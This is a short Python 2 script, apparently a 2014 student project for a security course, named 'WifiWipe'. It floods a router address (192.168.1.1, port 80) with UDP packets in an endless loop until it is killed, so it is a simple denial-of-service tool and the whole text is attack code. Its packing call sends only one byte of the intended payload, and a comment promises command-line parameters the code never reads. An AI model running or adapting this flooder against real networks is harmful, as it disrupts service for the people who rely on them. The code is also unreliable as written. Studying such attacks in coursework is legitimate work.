#! /usr/bin/env python

# WifiWipe Request Generation Script
# Seth Darbyshire 
# CSE 4471
# 03.21.2014

import sys, os, socket, struct, string, time, select

# Retrieve the host, port, and filename from the commmand line parameters
remote_ip = '192.168.1.1'				# The remote host of the server
remote_port = 80 			# The remote port of the server

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP uses Datagram, but not stream
	
#payload = inputFile.read(PAYLOAD_SIZE) # Read the next segment payload
payload = "aewnocihaol28107018j" * 3000
segment = struct.pack("s", payload)
ack_num = -1

# Continue to send packets until the program is manually killed
sequence_num = 0
while 1:
	
	print 'Sending Sequence Number ->',sequence_num

	s.sendto(segment, (remote_ip, remote_port))
	sequence_num = sequence_num + 1

	# if sequence_num > 15000:
	# 	sequence_num = 0

# Close the socket and finish execution
s.close() 
print 'Finished executing'
